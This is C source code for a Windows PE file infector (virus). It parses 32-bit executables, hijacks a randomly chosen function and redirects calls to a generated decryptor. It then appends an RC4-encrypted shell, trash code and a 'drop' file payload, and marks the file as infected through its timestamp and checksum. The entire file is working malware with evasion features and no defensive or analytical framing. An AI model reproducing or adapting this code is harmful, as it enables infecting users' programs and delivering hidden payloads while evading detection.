#include <Windows.h>
#include "infect.h"
#include "common.h"
#include "ldasm.h"
#include "morf.h"
#include "crc32.h"
#include "loader.h"

uint32 rnd(uint32 a){
	uint32 r=crc32(0,(uint8*)&a,4);//a*0x41C64E6D+0x00003039;
	return r;
}

uint32 rnd(){
	uint32 r=0;
	_asm {
		pushad
		rdtsc
		mov r,eax
		popad
	}
	r=rnd(r);
	return r;
}


void rnd(uint8 *data,int size){
	uint32 key=rnd();
	int j=0;
	for (int i=0;i<size;i++){
		if (j==0) key=rnd(key);
		data[i]=((uint8*)&key)[j];
		j++;
		j=j%4;
	}
}

uint32 align(uint32 addr,uint32 al){
	uint32 r=(addr + (al - 1)) & (~(al - 1));
	return r;
}

uint32 rvatoa(BLOCK *b,uint32 rva){
	uint32 r=0;
	IMAGE_FILE_HEADER *ifh=(IMAGE_FILE_HEADER *)(b->data+*(uint32*)&b->data[0x3c]+4);
	IMAGE_OPTIONAL_HEADER *ioh=(IMAGE_OPTIONAL_HEADER*)(ifh+1);
	IMAGE_SECTION_HEADER *ish=(IMAGE_SECTION_HEADER *)((uint8*)ifh+ifh->SizeOfOptionalHeader+sizeof(IMAGE_FILE_HEADER));
	if (!mem_valid(b,(uint8*)ish,sizeof(IMAGE_SECTION_HEADER))){
		return r;
	}
	
	for (int i=0;i<ifh->NumberOfSections;i++){
		if (ish[i].VirtualAddress<=rva && (ish[i].VirtualAddress+ish[i].Misc.VirtualSize)>rva){
			r=ish[i].PointerToRawData+(rva-ish[i].VirtualAddress);
			break;
		}
	}

	return r;
}

bool check_pe(BLOCK *b){
	bool r=false;
	if (b->size<0x200){
		return r;
	}
	uint16 *p=(uint16*)(b->data);
	if (*p!='ZM'){
		return r;
	}
	uint8 *pend=b->data+b->size;
	int c=*(uint32*)&b->data[0x3c];
	if (c<0 || c>b->size){
		return r;
	}
	p=(uint16*)(b->data+*(uint32*)&b->data[0x3c]);
	if (*p!='EP'){
		return r;
		
	}
	IMAGE_FILE_HEADER *p1=(IMAGE_FILE_HEADER *)(p+2);
	r=true;
	return r;
}

bool mem_valid(BLOCK *b,uint8* p,uint32 align){
	bool r=false;
	uint8* pend=b->data+b->size;
	if (p>=b->data && pend>=(p+align)) r=true;
	return r;
}

bool mem_valid(BLOCK *b,int offset,uint32 align){
	bool r=false;
	uint8* pend=b->data+b->size;
	uint8* p=b->data+offset;
	if (p>b->data && pend>(p+align)) r=true;
	return r;
}

int find_len_call(IMAGE_SECTION_HEADER *s,uint8 *p){
	int r=0;
	int i=0;
	uint32 l=0;
	while((i+10)<s->SizeOfRawData){
		l=size_of_code(p);
		if (l<=0){
			break;
		}

		if (*p==0xC2 && l==3){
			break;
		}

		if (*p==0xC3 && l==1){
			break;
		}
		p+=l;
		i+=l;
	}
	if (l>0) r=i;
	return r;
}

bool find_list_call(BLOCK *b,IMAGE_SECTION_HEADER *s,LIST_CALL *l){
	bool r=false;
	int i=0;
	l->count=0;
	uint8 *p=b->data+s->PointerToRawData;
	while ((i+5)<s->SizeOfRawData){
		if (*p==0xE8){ //call xxxxxxxx
			uint32 a=*(uint32*)(p+1);
			uint32 o=(p+5+a)-b->data;
			if (s->PointerToRawData<=o && (s->SizeOfRawData+s->PointerToRawData)>=(o+4)){
				uint32 m=*(uint32*)(p+5+a);

				if (((m&0x00ffffff)==0x00ec8b55)||	//push ebp; mov ebp,esp;
					(m==0x8B55FF8B)){				//mov edi,edi; push ebp
					m=find_len_call(s,p+5+a);
					if (l->count==0){
						l->list=(ITEM_CALL*)m_malloc(sizeof(ITEM_CALL));
					}else{
						l->list=(ITEM_CALL*)m_realloc(l->list,(l->count+1)*sizeof(ITEM_CALL));				
					}
					l->list[l->count].offset=p-b->data;
					l->list[l->count].offset_in=(p-b->data)+5+a;
					l->list[l->count].len_func=m;
					l->list[l->count].rva=((uint32)l->list[l->count].offset-s->PointerToRawData)+s->VirtualAddress;
					l->list[l->count].rva_in=((uint32)l->list[l->count].offset_in-s->PointerToRawData)+s->VirtualAddress;
					l->count++;
					p+=5;
					i+=5;
					r=true;
				}
			}
		}
		i++;
		p++;
	}

	return r;
}

int __cdecl func_item_call_cmp(const void *p1,const void *p2){
	ITEM_CALL *ic1=(ITEM_CALL *)p1;
	ITEM_CALL *ic2=(ITEM_CALL *)p2;
	int r=0;
	if (ic1->len_func==ic2->len_func) r=0;
	if (ic1->len_func<ic2->len_func) r=1;
	if (ic1->len_func>ic2->len_func) r=-1;
	return r;
	
}

bool add_data(BLOCK *b,int size,BLOCK_FILE *bf){
	bool r=false;
	IMAGE_FILE_HEADER *ifh=(IMAGE_FILE_HEADER *)(b->data+*(uint32*)&b->data[0x3c]+4);
	IMAGE_OPTIONAL_HEADER *ioh=(IMAGE_OPTIONAL_HEADER*)(ifh+1);
	IMAGE_SECTION_HEADER *ish=(IMAGE_SECTION_HEADER *)((uint8*)ifh+ifh->SizeOfOptionalHeader+sizeof(IMAGE_FILE_HEADER));
	IMAGE_SECTION_HEADER *sec=&ish[0];
	for (int i=1;i<ifh->NumberOfSections;i++){
		if (ish[i].PointerToRawData>=sec->PointerToRawData){
			sec=&ish[i];
		}
	}

	uint32 s=(sec->Misc.VirtualSize>sec->SizeOfRawData)?sec->Misc.VirtualSize:sec->SizeOfRawData;
	int size_new=align(s+size,ioh->FileAlignment);
	int size_real=size_new+sec->PointerToRawData;
	bf->data=(uint8*)m_malloc(size_real);
	if (!bf->data) return r;
	bf->size=size_real;
	//rnd(bf->data,bf->size);
	memset(bf->data,0,bf->size);

	bf->offset=sec->PointerToRawData+s;
	bf->rva=sec->VirtualAddress+s;//sec->SizeOfRawData;
	bool x=true;
	for (int i=0;i<ifh->NumberOfSections;i++){
		if (ish[i].PointerToRawData){
			if (x) {
				memcpy(bf->data,b->data,ish[i].PointerToRawData);
				x=false;
			}
			memcpy(bf->data+ish[i].PointerToRawData,b->data+ish[i].PointerToRawData,ish[i].SizeOfRawData);
		}
	}

	ifh=(IMAGE_FILE_HEADER *)(bf->data+*(uint32*)&bf->data[0x3c]+4);
	ioh=(IMAGE_OPTIONAL_HEADER*)(ifh+1);
	ish=(IMAGE_SECTION_HEADER *)((uint8*)ifh+ifh->SizeOfOptionalHeader+sizeof(IMAGE_FILE_HEADER));
	sec=&ish[0];
	for (int i=1;i<ifh->NumberOfSections;i++){
		if (ish[i].PointerToRawData>=sec->PointerToRawData){
			sec=&ish[i];
		}
	}
	sec->SizeOfRawData=size_new;
	sec->Misc.VirtualSize=align(s+size,ioh->SectionAlignment);//size_new;
	ioh->SizeOfImage=sec->VirtualAddress+sec->Misc.VirtualSize;


	r=true;
	return r;
}

void checksum(uint8* base){
	IMAGE_FILE_HEADER *ifh=(IMAGE_FILE_HEADER *)(base+*(uint32*)&base[0x3c]+4);
	IMAGE_OPTIONAL_HEADER *ioh=(IMAGE_OPTIONAL_HEADER*)(ifh+1);
	IMAGE_SECTION_HEADER *ish=(IMAGE_SECTION_HEADER *)((uint8*)ifh+ifh->SizeOfOptionalHeader+sizeof(IMAGE_FILE_HEADER));
	uint32 ind=0;
	for (int i=0;i<ifh->NumberOfSections;i++){
		if (ish[i].PointerToRawData>ish[ind].PointerToRawData){
			ind=i;
		}
	}

	ioh->CheckSum=0;
	uint32 sum=0;
	uint32 size=ish[ind].PointerToRawData+ish[ind].SizeOfRawData;
	for (int i=0;i<size/2;i++){
		sum+=*(uint16*)&base[i*2];
		sum=(sum&0xFFFF)+(sum>>0x10);
	}
	sum=sum+(sum>>0x10)+size;
	ioh->CheckSum=sum;
}

bool find_import_api_by_name(BLOCK *b,char *lib,char *name,ITEM_API *api){
	bool r=false;
	uint32 clib=crc32(0,(uint8*)lib,strlen(lib));
	uint32 cname=crc32(0,(uint8*)name,strlen(name));

	IMAGE_FILE_HEADER *ifh=(IMAGE_FILE_HEADER *)(b->data+*(uint32*)&b->data[0x3c]+4);
	IMAGE_OPTIONAL_HEADER *ioh=(IMAGE_OPTIONAL_HEADER*)(ifh+1);
	if (!ioh->DataDirectory[1].VirtualAddress || !ioh->DataDirectory[1].Size){
		return r;
	}
	uint32 imp=rvatoa(b,ioh->DataDirectory[1].VirtualAddress);
	if (!imp){
		return r;
	}

	IMPORT_TABLE *it=(IMPORT_TABLE *)(b->data+imp);
	int n=ioh->DataDirectory[1].Size/sizeof(IMPORT_TABLE);
	uint32 ta,tn,l;
	for (int i=0;i<n;i++){
		if (it[i].FirstThunk==0 && it[i].ForwarderChain==0 && it[i].Name==0 && it[i].OriginalFirstThunk==0 && it[i].TimeDateStamp==0){
			return r;
		}
		l=rvatoa(b,it[i].Name);
		if (!l) return r;
		char *a=(char*)(b->data+l);
		int la=strlen(a);
		if (clib==crc32(0,(uint8*)_strlwr(a),la)){
			if (it[i].OriginalFirstThunk) tn=it[i].OriginalFirstThunk;
			else tn=it[i].FirstThunk;
			ta=it[i].FirstThunk;
			uint32 otn,ota;
			otn=rvatoa(b,tn);
			if (!otn) return r;
			ota=rvatoa(b,ta);
			if (!ota) return r;
			uint32 *ptn,*pta;
			pta=(uint32*)(b->data+ota);
			ptn=(uint32*)(b->data+otn);
			while (*pta && *ptn){
				if (*ptn&0x80000000==0x80000000){

				}else{
					uint32 ol=rvatoa(b,*ptn);
					if (!ol) return r;
					a=(char *)(b->data+ol);
					la=strlen(a+2);
					if (cname==crc32(0,(uint8*)a+2,la)){
						r=true;
					}
				}
				
				if (r){
					api->rva_addr=ta;
					api->rva_name=tn;
					api->offset_addr=ota;
					api->offset_name=otn;
					return r;
				}
				pta++;
				ptn++;
				ta+=4;
				tn+=4;
				ota+=4;
				otn+=4;
			}
			return r;
		}
	}
	return r;
}

bool find_import(BLOCK *bf,BLOCK *imp){
	bool r=false;
	ITEM_API api;
	imp->size=0;
	r=find_import_api_by_name(bf,"kernel32.dll","VirtualAlloc",&api);
	if (r){
		add_block(imp,(uint8*)&api,sizeof(ITEM_API));
	}else{
		r=find_import_api_by_name(bf,"kernel32.dll","GetModuleHandleA",&api);
		if (!r){
			r=find_import_api_by_name(bf,"kernel32.dll","LoadLibraryA",&api);
		}

		if (r) {
			add_block(imp,(uint8*)&api,sizeof(ITEM_API));
			r=find_import_api_by_name(bf,"kernel32.dll","GetProcAddress",&api);
		}

		if (r){
			add_block(imp,(uint8*)&api,sizeof(ITEM_API));
		}
	}
	if (!r && imp->size) m_free(imp->data);
	return r;
}

int count_min_call(LIST_CALL *l,int min){
	int r=0;
	int n=l->count;
	for (int i=0;i<n-1;i++){
		if (l->list[i].offset_in!=l->list[i+1].offset_in){//uniq
			if (l->list[i].len_func>min) r++;
		}
	}
	return r;
}

bool get_min_call(LIST_CALL *l,int min,int ind,ITEM_CALL *c){
	bool r=false;
	int n=l->count;
	int j=0;
	for (int i=0;i<n-1;i++){
		if (l->list[i].offset_in!=l->list[i+1].offset_in){//uniq
			if (l->list[i].len_func>min) {
				if (j==ind) {
					*c=l->list[i];
					r=true;
					break;
				}
				j++;
			}
		}
	}
	return r;
}

void add_crypt(BLOCK *b,uint8* d,int size,uint32 k,uint8 type){
	add_block(b,d,size);
	crypt(b->data+b->size-size,size,k,type);
}

int add_block(BLOCK *b,uint8* data,int size,int al,bool start){
	int r=0;
	uint8 *b_al;
	if (al) {
		b_al=(uint8*)m_malloc(al);
		rnd(b_al,al);
	}
	int s=align(size,al)-size;
	if (start){
		add_block(b,b_al,s);
		add_block(b,data,size);
	}else{
		add_block(b,data,size);
		add_block(b,b_al,s);
	}
	if (al) m_free(b_al);
	return size+s;
}

int add_crypt(BLOCK *b,uint8* d,int size,uint32 k,uint8 type,int al,bool start){
	int s=add_block(b,d,size,al,start);
	crypt(b->data+b->size-s,s,k,type);
	return s;
}

bool grab_reloc(BLOCK *b,ITEM_CALL *it,BLOCK *out){
	bool r=true;
	out->data=0;
	out->size=0;
	if (!it->offset_in || !it->len_func){
		return r;
	}

	IMAGE_FILE_HEADER *ifh=(IMAGE_FILE_HEADER *)(b->data+*(uint32*)&b->data[0x3c]+4);
	IMAGE_OPTIONAL_HEADER *ioh=(IMAGE_OPTIONAL_HEADER*)(ifh+1);

	if (!ioh->DataDirectory[5].VirtualAddress || !ioh->DataDirectory[5].Size){
		return r;
	}

	uint32 rl=rvatoa(b,ioh->DataDirectory[5].VirtualAddress);
	if (!rl){
		return r;
	}

	RELOCATION_DIRECTORY *rd=(RELOCATION_DIRECTORY *)(b->data+rl);
	int len_rl=0;
	while(len_rl<ioh->DataDirectory[5].Size){
		int n=(rd->SizeOfBlock-8)/2;
		if (rd->SizeOfBlock>=8){
			for (int i=0;i<n;i++){
				uint32 reloc=((uint16*)((uint8*)rd+8))[i];
				if (reloc){
					reloc=reloc&0xFFF;
					uint32 a=rvatoa(b,rd->VirtualAddress+reloc);
					if (a){
						if ((it->offset_in<=a)&& ((it->offset_in+it->len_func)>a)){
							a=rd->VirtualAddress+reloc;
							add_block(out,(uint8*)&a,4);
							((uint16*)((uint8*)rd+8))[i]=0;//kill reloc
						}
					}else{
						if (out->size) m_free(out->data);
						out->data=0;
						out->size=0;
						r=false;
						return r;
					}
				}
			}
		}
		len_rl+=rd->SizeOfBlock;
		rd=(RELOCATION_DIRECTORY *)((uint8*)rd+rd->SizeOfBlock);		
	}
	return r;
}

bool check_infected(BLOCK *b){
	bool r=false;
	IMAGE_FILE_HEADER *ifh=(IMAGE_FILE_HEADER *)(b->data+*(uint32*)&b->data[0x3c]+4);
	IMAGE_OPTIONAL_HEADER *ioh=(IMAGE_OPTIONAL_HEADER*)(ifh+1);
	IMAGE_SECTION_HEADER *ish=(IMAGE_SECTION_HEADER *)((uint8*)ifh+ifh->SizeOfOptionalHeader+sizeof(IMAGE_FILE_HEADER));
	uint16 s=0;
	uint8 *p=b->data;
	uint32 t=ifh->TimeDateStamp;
	uint32 c=ioh->CheckSum;
	ioh->CheckSum=0;
	ifh->TimeDateStamp&=0xFFFF0000;

	for (int i=0;i<b->size;i++){
		s+=p[i];
	}
	ifh->TimeDateStamp=t;
	ioh->CheckSum=c;
	if (s==(uint16)t) r=true;
	return r;
}

bool set_infected(BLOCK *b){
	bool r=false;
	IMAGE_FILE_HEADER *ifh=(IMAGE_FILE_HEADER *)(b->data+*(uint32*)&b->data[0x3c]+4);
	IMAGE_OPTIONAL_HEADER *ioh=(IMAGE_OPTIONAL_HEADER*)(ifh+1);
	IMAGE_SECTION_HEADER *ish=(IMAGE_SECTION_HEADER *)((uint8*)ifh+ifh->SizeOfOptionalHeader+sizeof(IMAGE_FILE_HEADER));
	uint16 s=0;
	uint8 *p=b->data;
	
	ioh->CheckSum=0;
	ifh->TimeDateStamp&=0xFFFF0000;
	if (!ifh->TimeDateStamp){
		ifh->TimeDateStamp=rnd()&0xFFFF0000;
	}

	for (int i=0;i<b->size;i++){
		s+=p[i];
	}
	ifh->TimeDateStamp|=s;
	checksum(b->data);
	r=true;
	return r;
}

bool infect(BLOCK bf,BLOCK drop,BLOCK *out){
	bool r=false;
	out->size=0;

	if (!check_pe(&bf)){
		return r;
	}

	IMAGE_FILE_HEADER *ifh=(IMAGE_FILE_HEADER *)(bf.data+*(uint32*)&bf.data[0x3c]+4);
	if (ifh->Machine!=0x014c){//i386
		return r;
	}

	if (check_infected(&bf)){
		return r;
	}

	IMAGE_OPTIONAL_HEADER *ioh=(IMAGE_OPTIONAL_HEADER*)(ifh+1);
	IMAGE_SECTION_HEADER *ish=(IMAGE_SECTION_HEADER *)((uint8*)ifh+ifh->SizeOfOptionalHeader+sizeof(IMAGE_FILE_HEADER));
	if (!mem_valid(&bf,(uint8*)ish,sizeof(IMAGE_SECTION_HEADER))){
		return r;
	}
	
	IMAGE_SECTION_HEADER *sec=0;
	for (int i=0;i<ifh->NumberOfSections;i++){
		if (ish[i].VirtualAddress<=ioh->AddressOfEntryPoint && (ish[i].VirtualAddress+ish[i].Misc.VirtualSize)>ioh->AddressOfEntryPoint){
			sec=&ish[i];
			break;
		}
	}
	
	if (!sec){
		return r;
	}

	if (!mem_valid(&bf,bf.data+sec->PointerToRawData,sec->SizeOfRawData)){
		return r;
	}

	ioh->DataDirectory[4].VirtualAddress=ioh->DataDirectory[4].Size=0;
	ifh->Characteristics|=1;

	ITEM_API api;
	BLOCK imp;
	imp.size=0;

	r=find_import(&bf,&imp);
	if (!r){
		return r;
	}
	
	r=false;

	LIST_CALL lc;
	if (!find_list_call(&bf,sec,&lc)){
		m_free(imp.data);
		return r;
	}

	qsort(lc.list,lc.count,sizeof(ITEM_CALL),func_item_call_cmp);
	
	//get limit size call
	int n=count_min_call(&lc,MIN_SIZE_DECRYPT);
	if (!n){
		m_free(imp.data);
		m_free(lc.list);
		return r;
	}

	ITEM_CALL grab;
	int x=rnd()%n;
	get_min_call(&lc,MIN_SIZE_DECRYPT,x,&grab);

	//check relocation grab function
	BLOCK reloc;
	if (!grab_reloc(&bf,&grab,&reloc)){
		m_free(imp.data);
		m_free(lc.list);
		return r;
	}

	//create crypt keys
	BLOCK inf;
	inf.size=0;
	uint32 k0=rnd();
	uint32 k1=rnd();
	uint32 k2=rnd();
	uint32 k3=rnd();
	uint32 k4=rnd();
	uint32 k5=rnd();
	uint32 k6=rnd();

	//------------add trash shell---------------
	BLOCK btd;
	btd.size=0;
	GEN_ITEM_CALL itc;
	itc.narg=0;
	build_trash_decryp(&btd,k1,0,SIZE_SHELL,0,&itc);

	int len_btd=add_block(&inf,btd.data,btd.size,4,true);
	itc.offset+=(len_btd-btd.size);//end trash shell

	//-------------add shell---------------
	uint32 s=(ish[ifh->NumberOfSections-1].Misc.VirtualSize>ish[ifh->NumberOfSections-1].SizeOfRawData)?ish[ifh->NumberOfSections-1].Misc.VirtualSize:ish[ifh->NumberOfSections-1].SizeOfRawData;
	int len_shell=add_block(&inf,(uint8*)START_SHELL,SIZE_SHELL,4,false);	//add shell
	//init shell
	SHELL_BLOCK *sb=(SHELL_BLOCK *)(inf.data+inf.size-sizeof(SHELL_BLOCK)-(len_shell-SIZE_SHELL));
	sb->key=k5;
	sb->rva=ish[ifh->NumberOfSections-1].VirtualAddress+s+inf.size;
	crypt(inf.data+inf.size-len_shell,SIZE_SHELL,k1,_CIP_TRASH);
	uint32 type_cip=rnd()%3;
	crypt(inf.data,inf.size,k0,type_cip); //crypt shell

	//grab function
	DECRYPT_ITEM ditem;
	ditem.key=k2;
	ditem.size=grab.len_func;
	add_crypt(&inf,(uint8*)&ditem,sizeof(DECRYPT_ITEM),k5,_CIP_RC4);
	add_crypt(&inf,(uint8*)(bf.data+grab.offset_in),grab.len_func,k2,_CIP_RC4); //grab function
	add_crypt(&inf,(uint8*)&grab,sizeof(ITEM_CALL),k2,_CIP_RC4); //info about grab function

	//add list call
	ditem.key=k3;
	ditem.size=lc.count*sizeof(ITEM_CALL);
	add_crypt(&inf,(uint8*)&ditem,sizeof(DECRYPT_ITEM),k5,_CIP_RC4);
	add_crypt(&inf,(uint8*)(lc.list),lc.count*sizeof(ITEM_CALL),k3,_CIP_RC4); //list call
	add_crypt(&inf,(uint8*)(&lc.count),4,k3,_CIP_RC4);
	
	//add grab relocation 
	ditem.key=k6;
	ditem.size=reloc.size;
	add_crypt(&inf,(uint8*)&ditem,sizeof(DECRYPT_ITEM),k5,_CIP_RC4);
	add_crypt(&inf,(uint8*)reloc.data,reloc.size,k6,_CIP_RC4); //add grab relocation

	//add drop file
	ditem.key=k4;
	ditem.size=drop.size;
	add_crypt(&inf,(uint8*)&ditem,sizeof(DECRYPT_ITEM),k5,_CIP_RC4);
	add_crypt(&inf,(uint8*)(drop.data),drop.size,k4,_CIP_RC4); //drop file
	
	//magic end NULL
	memset(&ditem,0,sizeof(DECRYPT_ITEM));
	add_crypt(&inf,(uint8*)&ditem,sizeof(DECRYPT_ITEM),k5,_CIP_RC4);


	BLOCK_FILE bfnew;
	if (!add_data(&bf,inf.size,&bfnew)){ //add data in end section
		m_free(inf.data);
		m_free(lc.list);
		m_free(imp.data);
		if (reloc.size) m_free(reloc.data);
		return r;
	}


	BLOCK dec;
	dec.size=0;
	build_decrypt(&dec,ioh->ImageBase,grab.rva_in,bfnew.rva,inf.size,len_btd+len_shell,k0,&imp,itc.offset,type_cip); //���������� ���������
	
	//copy decryptor 1
	memcpy(bfnew.data+grab.offset_in,dec.data,dec.size);

	//init hook call 
	int j=0;
	for (int i=0;i<lc.count-1;i++){
		if (!(grab.offset_in<=lc.list[i].offset && (grab.offset_in+grab.len_func)>=lc.list[i].offset))
			*(uint32*)(bfnew.data+lc.list[i].offset+1)=grab.rva_in-(5+lc.list[i].rva);
	}

	//copy builded data
	memcpy(bfnew.data+bfnew.offset,inf.data,inf.size);

	
	//checksum(bfnew.data);
	out->data=bfnew.data;
	out->size=bfnew.size;
	set_infected(out);

	m_free(imp.data);
	m_free(dec.data);
	m_free(lc.list);
	m_free(inf.data);
	m_free(btd.data);
	if (reloc.size) m_free(reloc.data);
	r=true;
	return r;
}